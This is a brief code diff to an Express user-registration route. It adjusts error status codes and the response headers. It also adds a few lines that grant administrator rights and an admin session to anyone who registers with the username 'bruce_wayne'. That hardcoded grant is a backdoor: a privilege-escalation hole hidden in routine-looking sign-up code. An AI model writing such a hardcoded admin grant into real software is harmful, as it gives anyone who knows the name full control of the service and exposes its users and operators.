@@ -24,14 +24,18 @@ router.post('/register', function (req, res, next) {
 
   User.register(username, password, email, users, function (err, user) {
     if (err) {
-      if (err instanceof AuthError) {
-        return next(new HttpError(403, err.message));
+      if (err instanceof HttpError) {
+        return next(new HttpError(409, err.message));
       } else {
         return next(err);
       }
     }
+    if (user[0].username === "bruce_wayne") {
+      user[0].isAdmin = true;
+      req.session.admin = user[0].username;
+    }
     req.session.user = user[0].id
-    res.statusCode = 200;
+    res.writeHead(200, {'Content-Type': 'application/json'});
     res.end(JSON.stringify(user[0]));
   });
 });
